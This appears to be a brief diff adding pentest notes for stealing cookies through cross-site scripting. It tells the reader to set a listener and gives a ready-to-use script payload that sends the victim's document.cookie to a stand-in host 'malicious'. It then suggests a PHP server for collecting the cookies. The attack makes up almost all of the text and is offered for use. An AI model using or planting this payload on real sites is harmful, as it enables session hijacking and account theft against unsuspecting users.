@@ -1,0 +1,6 @@
+Set a listener for victim's connection
+
+XSS Payload:
+<script>document.write('<img src="http://malicious/?'+document.cookie+' "/>');</script>
+
+Alternatively a server can be set to retrieve the cookies via php.
